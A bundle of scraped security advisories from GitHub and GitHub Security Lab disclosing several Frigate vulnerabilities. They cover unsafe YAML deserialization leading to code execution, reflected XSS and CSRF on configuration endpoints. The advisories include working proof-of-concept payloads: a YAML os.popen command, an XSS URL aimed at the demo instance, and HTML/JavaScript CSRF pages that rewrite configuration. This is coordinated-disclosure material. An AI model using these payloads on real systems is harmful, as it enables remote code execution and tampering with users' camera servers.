=== Content from github.com_ac5dcc74_20250114_220002.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fsecurity%2Fadvisories%2FGHSA-qp3h-4q62-p428)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fsecurity%2Fadvisories%2FGHSA-qp3h-4q62-p428)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=blakeblackshear%2Ffrigate)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[blakeblackshear](/blakeblackshear)
/
**[frigate](/blakeblackshear/frigate)**
Public

* [Notifications](/login?return_to=%2Fblakeblackshear%2Ffrigate) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fblakeblackshear%2Ffrigate)
* [Star
   20.3k](/login?return_to=%2Fblakeblackshear%2Ffrigate)

* [Code](/blakeblackshear/frigate)
* [Issues
  116](/blakeblackshear/frigate/issues)
* [Pull requests
  47](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects
  0](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

Additional navigation options

* [Code](/blakeblackshear/frigate)
* [Issues](/blakeblackshear/frigate/issues)
* [Pull requests](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

# Unsafe deserialization in `load\_config\_with\_no\_duplicates` of `frigate/util/builtin.py` (GHSL-2023-190)

High

[blakeblackshear](/blakeblackshear)
published
GHSA-qp3h-4q62-p428
Oct 28, 2023

## Package

No package listed

## Affected versions

<= v0.12.1, < v0.13.0 Beta 3

## Patched versions

v0.13.0 Beta 3

## Description

## Summary

An unsafe deserialization vulnerability was identified in the endpoints used to save configurations for Frigate. This can lead to unauthenticated remote code execution. This can be performed through the UI at `/config` or through a direct call to `/api/config/save`.

Exploiting this vulnerability requires the attacker to both know very specific information about a user's Frigate server and requires an authenticated user to be tricked into clicking a specially crafted link to their Frigate instance.

This vulnerability could exploited by an attacker under the following circumstances:

1. Frigate publicly exposed to the internet (even with authentication)
2. Attacker knows the address of a user's Frigate instance
3. Attacker crafts a specialized page which links to the user's Frigate instance
4. Attacker finds a way to get an authenticated user to visit their specialized page and click the button/link

## Details

Input is initially accepted through `http.py` at [frigate/http.py:998](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L998-L998):

```
@bp.route("/config/save", methods=["POST"])
def config_save():
    save_option = request.args.get("save_option")

    new_config = request.get_data().decode()
```

The user-provided input is then parsed and loaded by `load_config_with_no_duplicates` at [frigate/config.py:1244](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/config.py#L1244-L1244):

```
@classmethod
def parse_raw(cls, raw_config):
    config = load_config_with_no_duplicates(raw_config)
    return cls.parse_obj(config)
```

However, `load_config_with_no_duplicates` does not sanitize this input by merit of using `yaml.loader.Loader` which can instantiate custom constructors. A provided payload will be executed directly at [frigate/util/builtin.py:110](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/util/builtin.py#L110-L110):

```
PreserveDuplicatesLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, map_constructor
)
return yaml.load(raw_config, PreserveDuplicatesLoader)
```

This vulnerability was found using CodeQL’s [Deserialization of user-controlled data query](https://codeql.github.com/codeql-query-help/python/py-unsafe-deserialization/) for Python.

## Impact

This issue may lead to pre-authenticated Remote Code Execution.

## Proof of Concept:

1. Start Frigate in [Docker](https://docs.frigate.video/frigate/installation/#docker) for ease of setup.
2. Navigate to `localhost:5000/config`.
3. Enter the following content into the config, and save the configuration:

```
!!python/object/apply:os.popen
- touch /tmp/pwned

```

5. Note that `/tmp/pwned` is created in the container. This access can also be extended to write to mounted filesystems if not mounted as read-only.

### Severity

High

### CVE ID

CVE-2023-45672

### Weaknesses

[CWE-502](/advisories?query=cwe%3A502)

### Credits

* [![@jorgectf](https://avatars.githubusercontent.com/u/46056498?s=40&v=4)](/jorgectf)
  [jorgectf](/jorgectf)
  Reporter
* [![@maclarel](https://avatars.githubusercontent.com/u/21298298?s=40&v=4)](/maclarel)
  [maclarel](/maclarel)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_c078a96a_20250114_220009.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

December 12, 2023
# GHSL-2023-190: Several vulnerabilities in Frigate - CVE-2023-45672, CVE-2023-45671, CVE-2023-45670

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
Logan MacLaren](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2023-10-04: Report sent to blakeb@blakeshome.com
* 2023-10-07: Maintainer acknowledges the report
* 2023-10-10: Created reports through Private Vulnerability Reporting: [GHSA-qp3h-4q62-p428](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-qp3h-4q62-p428), [GHSA-jjxc-m35j-p56f](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-jjxc-m35j-p56f), [GHSA-xq49-hv88-jr6h](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-xq49-hv88-jr6h)
* 2023-10-28: Reports are published

## Summary

* ### Unsafe deserialization in `load_config_with_no_duplicates` of `frigate/util/builtin.py` (`GHSL-2023-190`)

  + An unsafe deserialization vulnerability was identified in the endpoints used to save configurations for Frigate. This can lead to unauthenticated remote code execution. This can be performed through the UI at `/config` or through a direct call to `/api/config/save`.
* ### Reflected XSS through `/<camera_name>` API endpoints (`GHSL-2023-195`)

  + There is a reflected XSS vulnerability in any API endpoints reliant on the `/<camera_name>` base path as values provided for the path are not sanitized.
* ### Cross-site request forgery vulnerability in `config_save` and `config_set` request handlers (`GHSL-2023-198`)

  + The [`config/save`](https://github.com/blakeblackshear/frigate/blob/6aedc39a9a421cf48000a727f36b4c1495848a1d/frigate/http.py#L998) and [`config/set`](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L1060) endpoints of Frigate do not implement any CSRF protection. This makes it possible for a request sourced from another site to update the configuration of the Frigate server (e.g. via “[“drive-by” attack](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/)).
* ### Cross-site scripting in `/logs/<service>` endpoint (`GHSL-2023-209`)

  + The `logs/<service>` endpoint permits a user to retrieve logs from specified services (nginx, go2rtc, frigate), however if the user specifies a service that is not in that list this endpoint *should* return an error stating that the service is unavailable. The returned data is the default content-type of `text/html` and is unsanitized. As such, this permits the injection of javascript payloads.

    - Please note that this is not currently exploitable due to a [separate bug](https://github.com/blakeblackshear/frigate/blob/ead03c381b70fab1db7f6dd3952d6e8ea1217417/frigate/http.py#L1814), however if/when that is resolved it will permit this XSS vulnerability to be exploited. The bug preventing this can be found in the `if` statement that [wraps this error message](https://github.com/blakeblackshear/frigate/blob/ead03c381b70fab1db7f6dd3952d6e8ea1217417/frigate/http.py#L1814). This should presumable read `if not service_location` or `if service not in log_locations`.

## Project

Frigate

## Tested Version

* [v0.12.1](https://github.com/blakeblackshear/frigate/releases/tag/v0.12.1)
* [v0.13.0 Beta 1](https://github.com/blakeblackshear/frigate/releases/tag/v0.13.0-beta1)

## Details

### Issue 1: Unsafe deserialization in `load_config_with_no_duplicates` of `frigate/util/builtin.py` (`GHSL-2023-190`)

Input is initially accepted through `http.py` at [frigate/http.py:998](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L998-L998):

```
@bp.route("/config/save", methods=["POST"])
def config_save():
    save_option = request.args.get("save_option")

    new_config = request.get_data().decode()

```

The user-provided input is then parsed and loaded by `load_config_with_no_duplicates` at [frigate/config.py:1244](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/config.py#L1244-L1244):

```
@classmethod
def parse_raw(cls, raw_config):
    config = load_config_with_no_duplicates(raw_config)
    return cls.parse_obj(config)

```

However, `load_config_with_no_duplicates` uses `yaml.loader.Loader` which can instantiate custom constructors. A provided payload will be executed directly at [frigate/util/builtin.py:110](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/util/builtin.py#L110-L110):

```
PreserveDuplicatesLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, map_constructor
)
return yaml.load(raw_config, PreserveDuplicatesLoader)

```

This vulnerability was found using CodeQL’s [Deserialization of user-controlled data query](https://codeql.github.com/codeql-query-help/python/py-unsafe-deserialization/) for Python.

#### Impact

This issue may lead to pre-authenticated Remote Code Execution.

#### Proof of Concept:

1. Start Frigate in [Docker](https://docs.frigate.video/frigate/installation/#docker) for ease of setup.
2. Navigate to `localhost:5000/config`.
3. Enter the following content into the config, and save the configuration:

```
!!python/object/apply:os.popen
- touch /tmp/pwned

```

1. Note that `/tmp/pwned` is created in the container. This access can also be extended to write to mounted filesystems if not mounted as read-only.

#### Resources

* [CodeQL for Python: Unsafe Deserialization](https://codeql.github.com/codeql-query-help/python/py-unsafe-deserialization/)
* [Python Yaml Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization#rce)

### Issue 2: Reflected XSS through `/<camera_name>` API endpoints (`GHSL-2023-195`)

The [`recording_clip` request handler](https://github.com/blakeblackshear/frigate/blob/9185753322cc594b99509e9234c60647e70fae6f/frigate/http.py#L1426C14-L1426C14) returns an unescaped/unsanitized string based on the `camera_name` requested in the route that calls it. As a result of this, reflected XSS is possible.

By calling a camera that does not exist, we can force a failure response that will return the requested value. Note that this is response will use [Flask’s default `content-type` of `text/html`](https://flask.palletsprojects.com/en/2.3.x/quickstart/#about-responses):

```
if p.returncode != 0:
  logger.error(p.stderr)
  return f"Could not create clip from recordings for {camera_name}.", 500

```

As an example, we can trigger an XSS payload using the [official demo instance](https://demo.frigate.video) with the following `GET` request executed in a browser:

```
GET https://demo.frigate.video/api/%3Cimg%20src=%22%22%20onerror=alert(document.domain)%3E

```

This vulnerability was found using CodeQL’s [Reflected server-side cross-site scripting](https://codeql.github.com/codeql-query-help/python/py-reflective-xss/) for Python.

#### Impact

As the reflected values included in the URL are not sanitized or escaped, this permits execution arbitrary Javascript payloads.

#### Resources

* Python Library Reference: [html.escape()](https://docs.python.org/3/library/html.html#html.escape).
* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).

### Issue 3: Cross-site request forgery vulnerability in `config_save` and `config_set` request handlers (`GHSL-2023-198`)

When provided with a `POST` request containing the `save_option` parameter, the [`config_save` request handler](https://github.com/blakeblackshear/frigate/blob/367d7244d37f4e48ce1760b319c0fe141ab58711/frigate/http.py#L751) will attempt to write the user-supplied configuration in the request body to the configuration file on disk. Similarly, when provided with a `PUT` request the [`config_set` request handler](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L1060) will attempt to update the existing configuration file with the user-supplied values specified as variables in the URL.

As these endpoints do not have any CSRF protection or authentication requirement this permits a request from any origin (e.g. a [“drive-by” attack](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/)) to update the configuration of the Frigate server.

##### Proof of Concept

1. Start Frigate following the [Docker instructions](https://docs.frigate.video/frigate/installation#docker) using the [example `config.yml` file](https://github.com/blakeblackshear/frigate/blob/v0.12.1/config/config.yml.example).
2. Host an HTML file with the following contents anywhere accessible from your local machine:

```
<html>
<script>
function pwnd()
{
        let xhr = new XMLHttpRequest();
        xhr.open("POST", "http://<FRIGATE_SERVER>:5000/api/config/save?save_option=saveonly");

        xhr.onreadystatechange = function () {
                  if (xhr.readyState === 4) {
                              console.log(xhr.status);
                              console.log(xhr.responseText);
                            }};
let data = `mqtt:
  host: mqtt

cameras:
  pwnd:
    ffmpeg:
      inputs:
        - path: /media/frigate/car-stopping.mp4
          input_args: -re -stream_loop -1 -fflags +genpts
          roles:
            - detect
            - rtmp
    detect:
      height: 1080
      width: 1920
      fps: 5`;

        xhr.send(data);
        console.log("pwnd");
}

pwnd();
</script>
</html>

```

1. Access the new page (e.g. `http://<YOUR_WEB_SERVER_HOST>/poc.html`).
2. Note that the configuration of the Frigate service has been updated to now have a camera named `pwnd` instead of `test`.

This can also be performed against the `config/set` endpoint with the same setup outlined above, but the following `poc.html` which will update the `mqtt.host` value to `pwnd`:

```
<html>
<script>
        function pwn() {
        let xhr = new XMLHttpRequest();
        xhr.open("PUT", "http://<FRIGATE_SERVER>:5000/api/config/set?mqtt.host=pwnd");

        xhr.onreadystatechange = function () {
                  if (xhr.readyState === 4) {
                              console.log(xhr.status);
                              console.log(xhr.responseText);
                            }};

        xhr.send();
        }
pwn();
</script>
</html>

```

This demonstrates that requests from any origin can result in arbitrary writes to Frigate’s configuration.

#### Impact

This issue can lead to arbitrary configuration updates for the Frigate server, resulting in denial of service and possible data exfiltration.

#### Resources

* [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern)

### Issue 4: Cross-site scripting in `/logs/<service>` endpoint (`GHSL-2023-209`)

The following error message is returned with a content type of `text/html` and the values are fully user controlled and unsanitized.

```
return f"{service} is not a valid service", 404

```

This permits an attacker to craft a URL to a service that is not in [the valid `log_locations`](https://github.com/blakeblackshear/frigate/blob/ead03c381b70fab1db7f6dd3952d6e8ea1217417/frigate/http.py#L1807) and that instead contains a javascript payload for XSS purposes.

This was identified with CodeQL’s [Reflected server-side cross-site scripting](https://codeql.github.com/codeql-query-help/python/py-reflective-xss/#reflected-server-side-cross-site-scripting) query.

#### Impact

As the reflected values included in the URL are not sanitized or escaped, this permits execution arbitrary Javascript payloads.

#### Resources

* Python Library Reference: [html.escape()](https://docs.python.org/3/library/html.html#html.escape).
* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).

## CVE

* CVE-2023-45672
* CVE-2023-45671
* CVE-2023-45670

## Credit

This issue was discovered and reported by GHSL team members [@maclarel (Logan MacLaren)](https://github.com/maclarel) and [@jorgectf (Jorge Rosillo)](https://github.com/jorgectf).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-190`, `GHSL-2023-195`, `GHSL-2023-198`, or `GHSL-2023-209` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from github.com_8983dfd4_20250114_215945.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fblob%2F5658e5a4cc7376504af9de5e1eff178939a13e7f%2Ffrigate%2Fconfig.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fblob%2F5658e5a4cc7376504af9de5e1eff178939a13e7f%2Ffrigate%2Fconfig.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=blakeblackshear%2Ffrigate)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[blakeblackshear](/blakeblackshear)
/
**[frigate](/blakeblackshear/frigate)**
Public

* [Notifications](/login?return_to=%2Fblakeblackshear%2Ffrigate) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fblakeblackshear%2Ffrigate)
* [Star
   20.3k](/login?return_to=%2Fblakeblackshear%2Ffrigate)

* [Code](/blakeblackshear/frigate)
* [Issues
  116](/blakeblackshear/frigate/issues)
* [Pull requests
  47](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects
  0](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

Additional navigation options

* [Code](/blakeblackshear/frigate)
* [Issues](/blakeblackshear/frigate/issues)
* [Pull requests](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_552658c5_20250114_215953.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fblob%2F5658e5a4cc7376504af9de5e1eff178939a13e7f%2Ffrigate%2Fhttp.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fblob%2F5658e5a4cc7376504af9de5e1eff178939a13e7f%2Ffrigate%2Fhttp.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=blakeblackshear%2Ffrigate)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[blakeblackshear](/blakeblackshear)
/
**[frigate](/blakeblackshear/frigate)**
Public

* [Notifications](/login?return_to=%2Fblakeblackshear%2Ffrigate) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fblakeblackshear%2Ffrigate)
* [Star
   20.3k](/login?return_to=%2Fblakeblackshear%2Ffrigate)

* [Code](/blakeblackshear/frigate)
* [Issues
  116](/blakeblackshear/frigate/issues)
* [Pull requests
  47](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects
  0](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
